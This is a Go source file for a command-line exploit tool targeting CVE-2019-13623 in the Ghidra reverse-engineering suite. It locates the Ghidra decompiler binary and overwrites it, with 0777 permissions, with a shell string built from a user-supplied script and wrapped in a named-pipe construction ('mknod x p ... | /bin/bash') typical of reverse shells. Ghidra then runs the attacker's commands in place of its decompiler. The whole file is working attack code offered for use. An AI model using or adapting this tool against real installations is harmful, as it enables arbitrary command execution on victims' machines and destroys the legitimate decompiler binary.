package main

import (
    arg "github.com/s9rA16Bf4/ArgumentParser/go/arguments"
    "github.com/s9rA16Bf4/notify_handler/go/notify"
    "os"
    "fmt"
    "runtime"
    "strings"
    "bufio"
)

type data_t struct {
    path string
    target string
    script_path string
}
var c_data data_t

/* Info about the exploit
    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13623
    https://blog.fxiao.me/ghidra/
*/

func checkForDecompiler() bool {
    c_data.path = fmt.Sprintf("%s/Ghidra/Features/Decompiler/os/%s64/decompile", c_data.path, c_data.target)
    if _, err := os.Stat(c_data.path); err != nil {
        return false
    }

    return true
}

func makeCommandString() string {
    toReturn := "rm -f x; mknod x p && "

    file, err := os.Open(c_data.script_path)
    if err != nil {
        notify.Error(err.Error(), "exploit.makeCommandString()")
    }

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        toReturn += scanner.Text()
    }
    toReturn += " 0<x | /bin/bash 1>x"

    return toReturn
}

func main(){
    arg.Argument_add("--help", "-h", false, "Shows all available arguments and their purpose", []string{"NULL"})
    arg.Argument_add("--script", "-s", true, "The script of the commands to execute,  REQUIRED", []string{"NULL"})
    arg.Argument_add("--path_to_install", "-pti", true, "Path to the root directory of the ghidra installation to exploit, REQUIRED", []string{"NULL"})
    arg.Argument_add("--target_os", "-to", true, "Target os, will utilize the same OS as the current host if left out", []string{"windows", "linux", "mac"})

    arg.Argument_parse() // Lets check what the user entered

    if len(os.Args[0:]) == 1 ||  arg.Argument_check("-h"){
        arg.Argument_help()

    }else{
        if arg.Argument_check("-s") { // IP
            c_data.script_path = arg.Argument_get("-s")
        }else{
            notify.Error("Failed to find the script of commands to execute", "exploit.main()")
        }

        if arg.Argument_check("-pti") { // Path to installation
            c_data.path = arg.Argument_get("-pti")
        }else{
            notify.Error("Failed to find the Ghidra installation path", "exploit.main()")
        }

        if arg.Argument_check("-to") { // Target host os
            c_data.target = strings.ToLower(arg.Argument_get("-to"))
        }else{
            c_data.target = strings.ToLower(runtime.GOOS)
        }

        notify.Inform(fmt.Sprintf("Script to use '%s'", c_data.script_path))
        notify.Inform(fmt.Sprintf("Ghidra installation to use '%s'", c_data.path))
        notify.Inform(fmt.Sprintf("Will compile the exploit for '%s'", c_data.target))

        if !checkForDecompiler(){
            notify.Error("Failed to find the file to exploit", "exploit.main()")
        }

        exploit_line := makeCommandString()
        notify.Inform(fmt.Sprintf("Will utilize the following command string '%s'", exploit_line))

        if err := os.WriteFile(c_data.path, []byte(exploit_line), 0777); err != nil {
            notify.Error(err.Error(), "exploit.main()")
        }
    }
}
